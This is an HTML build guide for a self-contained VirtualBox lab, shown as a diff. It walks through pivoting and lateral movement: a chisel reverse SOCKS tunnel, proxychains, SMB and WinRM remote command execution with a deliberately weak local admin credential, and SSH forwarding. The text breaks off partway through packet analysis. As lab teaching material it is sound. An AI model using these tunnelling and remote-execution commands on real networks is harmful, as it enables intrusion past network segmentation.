@@ -1,0 +1,561 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Network Pivoting & Lateral Movement Lab — Complete Build Guide</title>
+<style>
+  :root{
+    --ink:#1a1f2b; --muted:#5b6472; --accent:#1f6feb; --accent2:#8250df;
+    --code-bg:#0d1117; --code-fg:#e6edf3; --line:#d7dce3; --soft:#f4f6fa;
+    --ok:#1a7f37; --warn:#9a6700; --bad:#cf222e;
+  }
+  *{box-sizing:border-box}
+  html{-webkit-print-color-adjust:exact; print-color-adjust:exact}
+  body{font-family:"Segoe UI",system-ui,Arial,sans-serif; color:var(--ink);
+       font-size:11pt; line-height:1.5; margin:0}
+  .page{padding:26px 34px}
+  h1,h2,h3,h4{line-height:1.25; color:var(--ink)}
+  h2{font-size:17pt; border-bottom:3px solid var(--accent); padding-bottom:5px;
+     margin-top:30px; page-break-before:always}
+  h2:first-of-type{page-break-before:avoid}
+  h3{font-size:13pt; color:var(--accent2); margin-top:22px}
+  h4{font-size:11.5pt; margin-top:16px; color:#333}
+  p{margin:8px 0}
+  code{font-family:"Cascadia Code",Consolas,monospace; font-size:9.6pt;
+       background:var(--soft); padding:1px 5px; border-radius:4px; color:#b1003d}
+  pre{background:var(--code-bg); color:var(--code-fg); padding:12px 14px;
+      border-radius:8px; overflow-x:auto; font-size:9.3pt; line-height:1.45;
+      font-family:"Cascadia Code",Consolas,monospace; white-space:pre-wrap;
+      word-break:break-word}
+  pre code{background:none; color:var(--code-fg); padding:0}
+  .why{background:#eef4ff; border-left:4px solid var(--accent); padding:9px 14px;
+       border-radius:0 6px 6px 0; margin:10px 0}
+  .why b{color:var(--accent)}
+  .gotcha{background:#fff6e5; border-left:4px solid var(--warn); padding:9px 14px;
+       border-radius:0 6px 6px 0; margin:10px 0}
+  .gotcha b{color:var(--warn)}
+  .ok{color:var(--ok); font-weight:600}
+  .bad{color:var(--bad); font-weight:600}
+  table{border-collapse:collapse; width:100%; margin:12px 0; font-size:9.8pt}
+  th,td{border:1px solid var(--line); padding:6px 9px; text-align:left; vertical-align:top}
+  th{background:var(--soft)}
+  .tag{display:inline-block; background:var(--accent); color:#fff; font-size:8pt;
+       padding:1px 7px; border-radius:10px; vertical-align:middle}
+  .cover{height:94vh; display:flex; flex-direction:column; justify-content:center;
+    page-break-after:always; background:
+    radial-gradient(circle at 20% 20%, #eaf1ff, transparent 60%),
+    radial-gradient(circle at 80% 70%, #f1ebff, transparent 55%)}
+  .cover h1{font-size:30pt; margin:0 0 6px; letter-spacing:-.5px}
+  .cover .sub{font-size:14pt; color:var(--muted)}
+  .cover .chain{margin-top:26px; font-family:"Cascadia Code",Consolas,monospace;
+    font-size:10pt; background:var(--code-bg); color:var(--code-fg);
+    padding:16px; border-radius:10px}
+  .meta{margin-top:22px; color:var(--muted); font-size:10pt}
+  .toc a{color:var(--ink); text-decoration:none}
+  .toc li{margin:3px 0}
+  .small{color:var(--muted); font-size:9pt}
+  @page{margin:14mm 0}
+  @media print{.page{padding:0 16mm}}
+</style>
+</head>
+<body>
+
+<div class="page">
+
+<!-- ===================== COVER ===================== -->
+<div class="cover">
+  <div class="tag">Hands-on VAPT lab · build walkthrough</div>
+  <h1>Network Pivoting &amp;<br>Lateral Movement Lab</h1>
+  <div class="sub">The complete <b>how &amp; why</b> build guide — every command, config, and gotcha</div>
+  <div class="chain">
+KALI-ATTACKER ──[DMZ 172.16.10.0/24]── PIVOT01 ──[INTERNAL 10.0.0.0/24]── WIN-TARGET01
+  172.16.10.5                       .15 / 10.0.0.15                       10.0.0.25
+        └──── no route to internal ──── tunnels through the pivot ────── Pwn3d! + RCE
+  </div>
+  <div class="meta">
+    Author: <b>Kashyap Naik</b> &nbsp;·&nbsp; Platform: VirtualBox 7.2.18 on Windows 11 (i3-1215U, 16&nbsp;GB)<br>
+    Built: 2026-11-02 &nbsp;·&nbsp; All work in an isolated, self-owned lab — no external systems touched.
+  </div>
+</div>
+
+<!-- ===================== TOC ===================== -->
+<h2 style="page-break-before:avoid">Contents</h2>
+<ol class="toc">
+  <li><a href="#intro">What this is & how to read it</a></li>
+  <li><a href="#blueprint">The blueprint: addressing & why Internal Networks</a></li>
+  <li><a href="#p1">Phase 1 — Host inspection (feasibility)</a></li>
+  <li><a href="#p23">Phases 2–3 — Building the VMs & networks</a></li>
+  <li><a href="#os">OS installation (Kali, Ubuntu, Windows) & the gotchas</a></li>
+  <li><a href="#ip">Static IP configuration — three different stacks</a></li>
+  <li><a href="#iso">Proving isolation (and why "Network is unreachable")</a></li>
+  <li><a href="#p5">Phase 5 — Getting Chisel in & building the tunnel</a></li>
+  <li><a href="#p6">Phase 6 — Proxychains</a></li>
+  <li><a href="#p7">Phase 7 — Internal enumeration (and SOCKS gotchas)</a></li>
+  <li><a href="#wincfg">Windows target config (the vulnerable setup)</a></li>
+  <li><a href="#p8">Phase 8 — Lateral movement: Pwn3d! + RCE</a></li>
+  <li><a href="#p9">Phase 9 — Advanced pivoting (SSH forwarding)</a></li>
+  <li><a href="#p10">Phase 10 — Packet analysis</a></li>
+  <li><a href="#p1112">Phases 11–12 — Detection & remediation</a></li>
+  <li><a href="#p13">Phase 13 — The automation framework</a></li>
+  <li><a href="#trouble">Troubleshooting log (every problem & fix)</a></li>
+  <li><a href="#appendix">Appendix — command & file reference</a></li>
+</ol>
+
+<!-- ===================== 1 INTRO ===================== -->
+<h2 id="intro">1 · What this is &amp; how to read it</h2>
+<p>This document is the full build record of a <b>network pivoting and lateral movement lab</b>
+built from scratch on VirtualBox. The goal: demonstrate how an attacker who has
+<b>no network route</b> to an internal system can still fully compromise it — by
+tunnelling through one <b>dual-homed "pivot"</b> host — and then show the <b>blue-team</b>
+view and the fixes.</p>
+<p>Every section gives the <b>exact commands</b> (the <i>how</i>) and the reasoning
+(the <i>why</i>), plus the real problems hit along the way. Read it top to bottom and
+you can rebuild the entire lab yourself.</p>
+<div class="why"><b>Scope & ethics.</b> All three machines are self-owned VMs on
+isolated VirtualBox <i>Internal Networks</i> with no bridge/NAT to the home network
+or internet during testing. All credentials are throwaway lab values. Nothing
+external is ever touched.</div>
+
+<h4>The cast</h4>
+<table>
+<tr><th>Host</th><th>Role</th><th>IP(s)</th><th>Network(s)</th></tr>
+<tr><td>KALI-ATTACKER</td><td>Attacker</td><td>172.16.10.5</td><td>DMZ-NET</td></tr>
+<tr><td>PIVOT01 (Ubuntu 24.04.5)</td><td>Dual-homed pivot</td><td>172.16.10.15 &amp; 10.0.0.15</td><td>DMZ-NET + INTERNAL-NET</td></tr>
+<tr><td>WIN-TARGET01 (Win 11 LTSC)</td><td>Internal target</td><td>10.0.0.25</td><td>INTERNAL-NET</td></tr>
+</table>
+
+<!-- ===================== 2 BLUEPRINT ===================== -->
+<h2 id="blueprint">2 · The blueprint: addressing &amp; why Internal Networks</h2>
+<p>Two isolated segments, connected only by the pivot:</p>
+<pre>DMZ-NET       172.16.10.0/24   (Kali + pivot's "outside" leg)
+INTERNAL-NET  10.0.0.0/24      (pivot's "inside" leg + Windows target)</pre>
+<div class="why"><b>Why VirtualBox <i>Internal Networks</i> (not NAT/bridged)?</b>
+An Internal Network is a private virtual L2 switch that only VMs naming it can use.
+It is <b>not</b> connected to the host or the internet — so isolation is enforced by
+design, with no firewall rule to trust. Bridged mode would put the vulnerable VMs on
+your real home LAN (dangerous); NAT would give them internet. Internal Networks give
+us a clean, contained lab.</div>
+<div class="why"><b>Why this topology proves a point.</b> Kali's only interface is on
+DMZ-NET; Windows's only interface is on INTERNAL-NET. They share no switch, so they
+<b>cannot talk directly</b>. Only PIVOT01 — with a leg in each — can reach both. That
+single fact is the entire basis of the attack (and of the segmentation control it
+bypasses).</div>
+
+<!-- ===================== 3 PHASE 1 ===================== -->
+<h2 id="p1">3 · Phase 1 — Host inspection (feasibility)</h2>
+<p>Before building anything, confirm the laptop can run three VMs. Run these on the
+Windows host (PowerShell):</p>
+<pre>Get-CimInstance Win32_Processor | Select Name,NumberOfCores,NumberOfLogicalProcessors
+Get-CimInstance Win32_ComputerSystem | % { [math]::Round($_.TotalPhysicalMemory/1GB,2) }
+Get-CimInstance Win32_LogicalDisk -Filter "DriveType=3" | Select DeviceID,Size,FreeSpace
+Get-ComputerInfo -Property "HyperV*"            # virtualization / hypervisor present?
+& "C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" --version
+& "$vbox" list vms ; & "$vbox" list intnets</pre>
+<p>Findings on this host: i3-1215U (6 cores / 8 threads), 15.7&nbsp;GB RAM, 243&nbsp;GB free,
+VirtualBox <b>7.2.18</b>.</p>
+<div class="gotcha"><b>Gotcha — contradictory VT-x flags.</b>
+<code>VirtualizationFirmwareEnabled</code> read <span class="bad">False</span> but
+<code>HyperVisorPresent</code> read <span class="ok">True</span>. These don't
+conflict: a Windows hypervisor (VBS / Memory Integrity) is <i>already running</i> and
+has claimed the VT-x extensions, so the OS can't "see" them. The presence of a running
+hypervisor <b>is</b> proof virtualization is enabled. The practical cost: VirtualBox is
+forced into slower Hyper-V-compat mode — the root cause of much later instability.</div>
+
+<!-- ===================== 4 PHASE 2-3 ===================== -->
+<h2 id="p23">4 · Phases 2–3 — Building the VMs &amp; networks</h2>
+<p>VMs are created head-lessly with <code>VBoxManage</code>. The reusable builder is
+<code>configurations/create-lab-vms.ps1</code>; here is what each step does, using
+KALI-ATTACKER as the example.</p>
+<pre>$vbox = "C:\Program Files\Oracle\VirtualBox\VBoxManage.exe"
+# 1. Create & register the VM (Debian type — Kali is Debian-based)
+&amp; $vbox createvm --name KALI-ATTACKER --ostype Debian_64 --register
+# 2. CPU / RAM / boot order; disable clipboard+drag-drop (host<->guest isolation)
+&amp; $vbox modifyvm KALI-ATTACKER --cpus 2 --memory 3072 --vram 32 `
+      --boot1 dvd --boot2 disk --boot3 none --boot4 none `
+      --clipboard-mode disabled --draganddrop disabled
+# 3. NIC1 -> Internal Network "DMZ-NET" only. No NAT, no bridge = no home-LAN path.
+&amp; $vbox modifyvm KALI-ATTACKER --nic1 intnet --intnet1 "DMZ-NET" `
+      --nictype1 82540EM --cableconnected1 on --nicpromisc1 deny
+&amp; $vbox modifyvm KALI-ATTACKER --nic2 none --nic3 none --nic4 none
+# 4. 40 GB dynamic disk + SATA controller + an empty DVD for the installer ISO
+&amp; $vbox createmedium disk --filename "...\KALI-ATTACKER.vdi" --size 40960 --format VDI
+&amp; $vbox storagectl KALI-ATTACKER --name "SATA" --add sata --controller IntelAhci --portcount 2 --bootable on
+&amp; $vbox storageattach KALI-ATTACKER --storagectl "SATA" --port 0 --device 0 --type hdd --medium "...\KALI-ATTACKER.vdi"
+&amp; $vbox storageattach KALI-ATTACKER --storagectl "SATA" --port 1 --device 0 --type dvddrive --medium emptydrive</pre>
+<table>
+<tr><th>VM</th><th>vCPU / RAM</th><th>Disk</th><th>NIC1</th><th>NIC2</th></tr>
+<tr><td>KALI-ATTACKER</td><td>2 / 3072 MB</td><td>40 GB</td><td>intnet DMZ-NET</td><td>none</td></tr>
+<tr><td>PIVOT01</td><td>1 / 1536 MB</td><td>20 GB</td><td>intnet DMZ-NET</td><td>intnet INTERNAL-NET</td></tr>
+<tr><td>WIN-TARGET01</td><td>2 / 4096 MB</td><td>50→65 GB</td><td>intnet INTERNAL-NET</td><td>none</td></tr>
+</table>
+<div class="why"><b>Why these specific flags.</b>
+<code>--nictype 82540EM</code> = Intel PRO/1000, universally driver-supported.
+<code>--nicpromisc deny</code> keeps NICs from sniffing the switch (deliberate posture).
+<code>--boot1 dvd</code> boots the installer first, then disk. No DHCP server is
+configured on the internal networks — every host gets a <b>static</b> IP inside its
+guest OS, which is the controlled approach the brief wanted.</div>
+<div class="gotcha"><b>Gotcha — a typo cost the RAM setting.</b> The first run used
+<code>--boot1 dcd</code> (a typo). VBoxManage rejected that whole <code>modifyvm</code>
+command, so RAM/CPU silently stayed at defaults (1024/1). Native-exe errors don't throw
+in PowerShell, so it was only caught by verifying afterwards. Lesson: always re-read the
+result — <code>showvminfo --machinereadable</code> — don't assume success.</div>
+<p><b>"Creating" the networks:</b> there is no separate command. An Internal Network
+exists the moment a VM's adapter names it (<code>--intnet1 "DMZ-NET"</code>). No DHCP is
+run, so the networks carry only what we statically configure.</p>
+
+<!-- ===================== 5 OS INSTALL ===================== -->
+<h2 id="os">5 · OS installation &amp; the gotchas</h2>
+<p>Each VM boots its ISO (attached to the DVD port) and installs interactively. All ISOs
+were downloaded over official links and <b>SHA256-verified</b> before use.</p>
+<table>
+<tr><th>VM</th><th>ISO</th><th>Verify</th></tr>
+<tr><td>Kali</td><td>kali-linux-2026.3-installer-amd64.iso (full, not netinst)</td><td>SHA256 vs kali SHA256SUMS</td></tr>
+<tr><td>Ubuntu</td><td>ubuntu-24.04.5-live-server-amd64.iso</td><td>SHA256 vs releases.ubuntu.com</td></tr>
+<tr><td>Windows</td><td>windows11-enterprise-ltsc-2024-eval-x64.iso</td><td>exact byte-count (no published hash)</td></tr>
+</table>
+<div class="why"><b>Why the <i>full</i> Kali installer, not netinst.</b> The lab VMs have
+no internet; netinst downloads packages mid-install and would fail. The full ISO is
+self-contained.</div>
+<div class="gotcha"><b>Gotcha — Windows 10 eval is gone.</b> Windows 10 reached
+end-of-support (Oct 2025); its eval page now redirects to "move to Windows 11." So the
+target became <b>Windows 11 Enterprise LTSC 2024</b>, which forced VM changes:
+EFI firmware + a virtual TPM 2.0 + a bigger (65 GB) disk:
+<pre>&amp; $vbox modifyvm WIN-TARGET01 --firmware efi --tpm-type 2.0 --ostype Windows11_64
+&amp; $vbox modifymedium disk "...\WIN-TARGET01.vdi" --resize 66560</pre></div>
+<div class="gotcha"><b>Gotcha — Windows 11 had <i>no display</i> under EFI.</b> With
+VirtualBox's default <code>vboxvga</code> adapter + EFI, the screen stayed black (0×0).
+The fix was switching the graphics controller, then manually booting the DVD from the
+EFI Boot Manager:
+<pre>&amp; $vbox modifyvm WIN-TARGET01 --graphicscontroller vmsvga --accelerate3d off</pre>
+VBoxVGA has no working EFI GOP driver; VMSVGA does.</div>
+
+<!-- ===================== 6 STATIC IP ===================== -->
+<h2 id="ip">6 · Static IP configuration — three different stacks</h2>
+<p>Each OS configures networking differently — a genuine lesson in itself.</p>
+
+<h3>Kali (NetworkManager)</h3>
+<p>The Kali installer put the static IP in a NetworkManager profile, <b>not</b> in
+<code>/etc/network/interfaces</code> (which only had loopback). A typo had set
+<code>127.16.10.5</code> instead of <code>172.16.10.5</code>:</p>
+<pre># Identify the manager (eth0 is handled by NetworkManager, profile "Wired connection 1")
+nmcli -t -f DEVICE,STATE,CONNECTION device
+# Fix the address, clear gateway/DNS (isolated net needs no gateway), re-activate
+sudo nmcli connection modify "Wired connection 1" ipv4.addresses 172.16.10.5/24 ipv4.method manual
+sudo nmcli connection modify "Wired connection 1" ipv4.gateway "" ipv4.dns ""
+sudo nmcli connection up "Wired connection 1"
+ip route     # => 172.16.10.0/24 dev eth0 ... src 172.16.10.5  (no default route)</pre>
+<div class="gotcha"><b>Gotcha — <code>127.x</code> is loopback.</b> With the typo the
+address showed <code>scope host</code> (the kernel treated 127.16.10.5 as loopback), so
+it could never talk on the LAN. The correct 172.16.0.0/12 is RFC-1918 private space and
+shows <code>scope global</code>. A one-digit slip would have silently broken all
+pivoting later.</div>
+
+<h3>Ubuntu pivot (netplan / systemd-networkd)</h3>
+<p>Ubuntu 24.04 uses netplan. The pivot is <b>dual-homed</b>, so both interfaces get a
+static address (matched to NICs by MAC):</p>
+<pre>printf 'network:\n  version: 2\n  ethernets:\n    enp0s3:\n      dhcp4: false\n      addresses: [172.16.10.15/24]\n    enp0s8:\n      dhcp4: false\n      addresses: [10.0.0.15/24]\n' | sudo tee /etc/netplan/50-cloud-init.yaml
+sudo chmod 600 /etc/netplan/50-cloud-init.yaml
+echo 'network: {config: disabled}' | sudo tee /etc/cloud/cloud.cfg.d/99-disable-network-config.cfg
+sudo netplan apply
+ip -br addr show        # enp0s3 UP 172.16.10.15/24 ; enp0s8 UP 10.0.0.15/24</pre>
+<div class="why"><b>Why two IPs, no gateway, and cloud-init disabled.</b> The pivot
+straddles both segments — that's what makes it a pivot. No gateway because there's no
+router. Cloud-init is disabled so it doesn't revert the static config on reboot.</div>
+
+<h3>Windows target (PowerShell NetTCPIP)</h3>
+<pre>New-NetIPAddress -InterfaceAlias Ethernet -IPAddress 10.0.0.25 -PrefixLength 24
+Set-NetConnectionProfile -InterfaceAlias Ethernet -NetworkCategory Private
+Rename-Computer -NewName WIN-TARGET01 -Force   # applies on next reboot</pre>
+
+<!-- ===================== 7 ISOLATION ===================== -->
+<h2 id="iso">7 · Proving isolation (and why "Network is unreachable")</h2>
+<p>Before attacking, prove the segmentation at the packet level. This is the control the
+whole project then bypasses.</p>
+<table>
+<tr><th>From → To</th><th>Result</th><th>Why</th></tr>
+<tr><td>Kali → pivot 172.16.10.15</td><td class="ok">reachable</td><td>same DMZ switch</td></tr>
+<tr><td>Kali → Windows 10.0.0.25</td><td class="bad">"connect: Network is unreachable"</td><td>no route to 10.0.0.0/24 at all</td></tr>
+<tr><td>pivot → both</td><td class="ok">reachable</td><td>a leg in each network</td></tr>
+<tr><td>Windows → Kali 172.16.10.5</td><td class="bad">"transmit failed. General failure"</td><td>no route to DMZ</td></tr>
+</table>
+<div class="why"><b>Two different failure messages, two different causes.</b> From Kali,
+<code>ping 10.0.0.25</code> fails with <b>"Network is unreachable"</b> — the kernel has no
+route, so it never even sends a packet. That is <i>stronger</i> than a timeout: the OS
+itself refuses. On Windows, pinging reports a general failure for the same reason.
+Also note: Windows Firewall drops inbound ICMP by default, and a bonus — ping TTL tells
+you the OS (64 = Linux, 128 = Windows).</div>
+
+<!-- ===================== 8 CHISEL ===================== -->
+<h2 id="p5">8 · Phase 5 — Getting Chisel in &amp; building the tunnel</h2>
+
+<h3>8.1 · The supply problem</h3>
+<p>Kali already ships nmap, nxc (NetExec), impacket, evil-winrm, proxychains4, nc — but
+<b>not</b> chisel, and neither the pivot nor Kali has internet. Solution: give the pivot
+a <i>temporary</i> outbound path, download chisel inside Linux (no Windows Defender to
+flag it), then re-isolate.</p>
+<pre># Host: hot-switch the pivot's NIC2 from INTERNAL-NET to NAT (NIC2 is already enabled)
+&amp; $vbox controlvm PIVOT01 nic2 nat
+# Pivot: configure NAT addressing MANUALLY (Ubuntu 24.04 has no dhclient).
+#        VirtualBox NAT on NIC *2* is the 10.0.3.0/24 subnet (per-slot!), gw .2, dns .3
+sudo ip route flush default
+sudo ip addr add 10.0.3.15/24 dev enp0s8
+sudo ip route add default via 10.0.3.2
+echo nameserver 10.0.3.3 | sudo tee /etc/resolv.conf
+curl -sI https://github.com | head -1        # HTTP/2 200  -> internet works
+# Download + install chisel
+curl -L -o /tmp/chisel.gz https://github.com/jpillora/chisel/releases/download/v1.12.0/chisel_1.12.0_linux_amd64.gz
+gunzip -f /tmp/chisel.gz &amp;&amp; chmod +x /tmp/chisel &amp;&amp; sudo mv /tmp/chisel /usr/local/bin/chisel
+# Host: switch NIC2 back to INTERNAL-NET; pivot: restore the static config
+&amp; $vbox controlvm PIVOT01 nic2 intnet "INTERNAL-NET"
+sudo ip addr flush dev enp0s8 ; sudo netplan apply</pre>
+<div class="gotcha"><b>Gotcha #1 — Defender flags chisel on Windows.</b> Decompressing
+chisel on the host triggered Defender ("contains a virus") — it's a known hacktool/PUA.
+That's exactly why we fetch it inside Linux. (It's also a real blue-team IOC.)</div>
+<div class="gotcha"><b>Gotcha #2 — VirtualBox NAT subnet is per-NIC-slot.</b> NAT on
+NIC1 is 10.0.2.0/24; on NIC2 it's <b>10.0.3.0/24</b>. Using the wrong one is why the
+first <code>curl</code> hung. Match the subnet to the slot.</div>
+<div class="gotcha"><b>Gotcha #3 — <code>dhclient</code> is gone in 24.04.</b> Ubuntu
+moved to systemd-networkd; the ISC client isn't installed. Hence the manual
+<code>ip addr/route</code> approach above.</div>
+
+<h3>8.2 · Moving chisel to Kali (no internet, stay isolated)</h3>
+<p>Serve it from the pivot over the (already-working) DMZ with a throwaway HTTP server:</p>
+<pre># Pivot: serve chisel on the DMZ interface
+mkdir -p /tmp/srv &amp;&amp; cp /usr/local/bin/chisel /tmp/srv/
+cd /tmp/srv &amp;&amp; nohup python3 -m http.server 8000 --bind 172.16.10.15 &amp;
+# Kali: pull it
+curl -s http://172.16.10.15:8000/chisel -o /tmp/chisel &amp;&amp; chmod +x /tmp/chisel
+/tmp/chisel --version    # 1.12.0</pre>
+
+<h3>8.3 · The reverse SOCKS tunnel</h3>
+<pre># KALI (server) — listens on 8080, allows reverse tunnels
+/tmp/chisel server -p 8080 --reverse --socks5
+# PIVOT (client) — dials BACK to Kali, requests a reverse SOCKS tunnel
+/usr/local/bin/chisel client 172.16.10.5:8080 R:socks
+# Result on KALI:
+ss -tlnp | grep 1080     # LISTEN 127.0.0.1:1080  (chisel)  <= the SOCKS5 proxy</pre>
+<div class="why"><b>What <code>R:socks</code> means &amp; why reverse.</b> <code>R:</code>
+= reverse: the SOCKS5 proxy is opened on the <i>server</i> (Kali) at 127.0.0.1:1080, and
+traffic is tunnelled to the client (pivot), which makes the real connection into the
+internal network. <b>Reverse</b> matters because the <i>victim</i> initiates the outbound
+connection — bypassing inbound firewalls/NAT, exactly how a real compromised host "calls
+home".</div>
+
+<!-- ===================== 9 PROXYCHAINS ===================== -->
+<h2 id="p6">9 · Phase 6 — Proxychains</h2>
+<p>proxychains "wraps" a tool's network calls onto the SOCKS proxy. A local config
+points it at the tunnel (no need to edit the system <code>/etc/proxychains4.conf</code>):</p>
+<pre>printf 'strict_chain\nquiet_mode\nproxy_dns\ntcp_read_time_out 15000\ntcp_connect_time_out 8000\n[ProxyList]\nsocks5 127.0.0.1 1080\n' > ~/pc.conf
+# Use it:
+proxychains4 -f ~/pc.conf &lt;any-tcp-tool&gt; &lt;internal-target&gt;</pre>
+<div class="why"><b>Why SOCKS5 and why 1080.</b> SOCKS5 proxies arbitrary TCP (and the
+chisel tunnel presents a SOCKS5 endpoint on Kali's 127.0.0.1:1080). <code>strict_chain</code>
+forces traffic through our one proxy; <code>proxy_dns</code> routes name lookups through
+it too. We mostly use raw IPs, so DNS isn't critical here.</div>
+
+<!-- ===================== 10 ENUMERATION ===================== -->
+<h2 id="p7">10 · Phase 7 — Internal enumeration (and SOCKS gotchas)</h2>
+<pre># Prove the tunnel reaches the internal net with a single blocking connect (reliable)
+proxychains4 -f ~/pc.conf nc -zv -w 8 10.0.0.15 22
+# => Strict chain ... 127.0.0.1:1080 ... 10.0.0.15:22 ... OK   (pivot's own SSH)</pre>
+<div class="gotcha"><b>Gotcha — nmap lies through SOCKS.</b>
+<code>proxychains nmap -sT</code> reported <i>every</i> port as "filtered" and finished in
+0.07s. nmap's parallel non-blocking connect-scan doesn't cooperate with the SOCKS
+wrapper. A single blocking <code>nc</code> connection shows the truth ("OK"). Rule:
+through a SOCKS pivot, prefer <code>nc</code>/tool-native checks over nmap connect scans.</div>
+<p>Service fingerprint via NetExec through the tunnel (after the target firewall is opened
+— see §11):</p>
+<pre>proxychains4 -f ~/pc.conf nxc smb 10.0.0.25
+# SMB 10.0.0.25 WIN-TARGET01  Windows 11/Server 2025 Build 26100 x64 (signing:True)(SMBv1:None)</pre>
+<div class="gotcha"><b>Gotcha — ICMP never tunnels.</b> SOCKS carries TCP only. You can't
+<code>ping</code> through the tunnel; "host up" must be judged by a TCP connect.</div>
+
+<!-- ===================== 11 WINDOWS CONFIG ===================== -->
+<h2 id="wincfg">11 · Windows target config (the vulnerable setup)</h2>
+<p>Driven from an elevated PowerShell inside WIN-TARGET01. This deliberately exposes the
+services and plants the weak credential that make lateral movement possible.</p>
+<h4>Open the firewall &amp; enable remoting</h4>
+<pre>Enable-NetFirewallRule -DisplayGroup 'File and Printer Sharing'      # SMB 445/139
+Enable-NetFirewallRule -DisplayGroup 'Windows Remote Management'     # WinRM 5985
+Enable-PSRemoting -Force -SkipNetworkProfileCheck
+# => "Configured LocalAccountTokenFilterPolicy to grant administrative rights remotely to local users"</pre>
+<h4>The deliberately-weak local admin (the misconfiguration)</h4>
+<pre>New-LocalUser -Name 'labadmin' -Password (ConvertTo-SecureString 'Lab@12345' -AsPlainText -Force) `
+  -FullName 'Lab Admin' -Description 'Deliberately weak lab admin' -PasswordNeverExpires -AccountNeverExpires
+Add-LocalGroupMember -Group 'Administrators' -Member 'labadmin'
+Add-LocalGroupMember -Group 'Remote Management Users' -Member 'labadmin'</pre>
+<h4>Allow ICMP (so the pivot can ping it) &amp; a loose share</h4>
+<pre>New-NetFirewallRule -DisplayName 'Lab-Allow-ICMPv4-In' -Protocol ICMPv4 -IcmpType 8 -Direction Inbound -Action Allow -Profile Any
+New-Item C:\LabShare -ItemType Directory -Force
+New-SmbShare -Name 'LabShare' -Path C:\LabShare -FullAccess 'Everyone'</pre>
+<div class="gotcha"><b>Gotcha — the <code>$pw</code> variable vanished.</b> Passing the
+password via a host-side <code>$pw</code> in a driven command let the <i>host</i> shell
+expand it to empty first, so New-LocalUser failed. Fix: inline the SecureString directly
+(as above), no variable.</div>
+<div class="why"><b>Why <code>labadmin</code> is a local admin with a weak password.</b>
+This is the classic real-world misconfiguration the lab models — a guessable admin
+credential is what turns "I can reach port 445" into full host compromise.</div>
+
+<!-- ===================== 12 LATERAL MOVEMENT ===================== -->
+<h2 id="p8">12 · Phase 8 — Lateral movement: Pwn3d! + RCE</h2>
+<p>All run on Kali, through the tunnel. First confirm the services are now reachable:</p>
+<pre>proxychains4 -f ~/pcv.conf nc -zv -w 8 10.0.0.25 445    # ... 445 (microsoft-ds) open
+proxychains4 -f ~/pcv.conf nc -zv -w 8 10.0.0.25 5985   # ... 5985 open</pre>
+<h4>Authenticate &amp; list shares (lateral movement)</h4>
+<pre>proxychains4 -f ~/pc.conf nxc smb 10.0.0.25 -u labadmin -p 'Lab@12345' --shares
+# [+] WIN-TARGET01\labadmin:Lab@12345 (Pwn3d!)
+# ADMIN$  READ,WRITE   |   C$  READ,WRITE   |   IPC$  READ</pre>
+<div class="why"><b>What <span class="ok">(Pwn3d!)</span> means.</b> NetExec prints it
+when the credential grants <b>local administrator</b> access. READ/WRITE on <code>C$</code>
+and <code>ADMIN$</code> = full control of the host — from a machine that can't even route
+to it directly.</div>
+<h4>Remote code execution</h4>
+<pre># WMI/DCOM FAILS through SOCKS (dynamic high ports, e.g. 49673, don't tunnel):
+proxychains4 -f ~/pc.conf nxc smb 10.0.0.25 -u labadmin -p 'Lab@12345' -x 'whoami'   # DCOM error
+# WinRM WORKS (single fixed port 5985 tunnels cleanly):
+proxychains4 -f ~/pc.conf nxc winrm 10.0.0.25 -u labadmin -p 'Lab@12345' -X 'whoami; hostname'
+# [+] Executed command (shell type: powershell)
+# win-target01\labadmin
+# WIN-TARGET01</pre>
+<div class="gotcha"><b>Gotcha — exec method matters through a pivot.</b> WMI/DCOM
+negotiates random high ports a SOCKS tunnel can't forward. <b>WinRM uses only port 5985</b>,
+so it tunnels perfectly. This is the key "which tool works through a pivot" lesson.</div>
+
+<!-- ===================== 13 ADVANCED PIVOTING ===================== -->
+<h2 id="p9">13 · Phase 9 — Advanced pivoting (SSH forwarding)</h2>
+<p>Chisel is one way; SSH gives native alternatives when you have an SSH account on the
+pivot.</p>
+<table>
+<tr><th>Technique</th><th>Command (from Kali)</th><th>Use when</th></tr>
+<tr><td>Local forward <code>-L</code></td><td>ssh -L 127.0.0.1:4445:10.0.0.25:445 pivot@172.16.10.15</td><td>one known service</td></tr>
+<tr><td>Dynamic / SOCKS <code>-D</code></td><td>ssh -D 127.0.0.1:1081 pivot@172.16.10.15</td><td>reach any internal host:port</td></tr>
+<tr><td>Remote forward <code>-R</code></td><td>ssh -R 127.0.0.1:4445:10.0.0.25:445 attacker@172.16.10.5</td><td>victim can only call out (reverse)</td></tr>
+<tr><td>Multi-hop</td><td>ssh -J pivot@172.16.10.15,user@10.0.0.50 deep@10.1.0.10</td><td>a 2nd network behind a 2nd pivot</td></tr>
+</table>
+<div class="why"><b>The concepts, kept straight.</b> <b>Port forwarding</b> = one door
+(a single host:port). <b>SOCKS proxying</b> = the whole building (any destination the
+pivot can reach), via one proxy port. <b>IP routing</b> would forward entire subnets but
+is noisy — deliberately left off here (<code>ip_forward=0</code>). <b>Tunnelling</b> is the
+encapsulation that carries any of these across a boundary. <b>Pivoting</b> is the overall
+goal. Build multi-hop only after the basic two-network pivot works.</div>
+
+<!-- ===================== 14 PACKET ANALYSIS ===================== -->
+<h2 id="p10">14 · Phase 10 — Packet analysis</h2>
+<p>A live capture on the pivot (which sees <i>both</i> sides) while the attack ran:</p>
+<pre>sudo tcpdump -i any -w /tmp/pivot-capture.pcap 'tcp port 8080 or tcp port 445 or tcp port 5985'
+# (trigger traffic from Kali) then analyse:
+sudo tcpdump -r /tmp/pivot-capture.pcap -nn 'tcp port 8080' | head   # DMZ: tunnel only
+sudo tcpdump -r /tmp/pivot-capture.pcap -nn 'tcp port 445'  | head   # internal: SMB</pre>
+<table>
+<tr><th>Traffic</th><th>Interface</th><th>Packets</th></tr>
+<tr><td>Chisel tunnel (to attacker, 8080)</td><td>enp0s3 (DMZ)</td><td>387</td></tr>
+<tr><td>SMB (to target, 445)</td><td>enp0s8 (INTERNAL)</td><td>214</td></tr>
+<tr><td>WinRM (to target, 5985)</td><td>enp0s8 (INTERNAL)</td><td>57</td></tr>
+</table>
+<div class="why"><b>The finding — tunnelling blinds each vantage point.</b> On the <b>DMZ</b>
+side every packet is just <code>172.16.10.15 ⇄ 172.16.10.5:8080</code> (the encrypted
+tunnel) — the SMB attack is hidden inside it. On the <b>internal</b> side the SMB appears
+to come from the <b>pivot</b> (10.0.0.15), never from the real attacker (172.16.10.5).
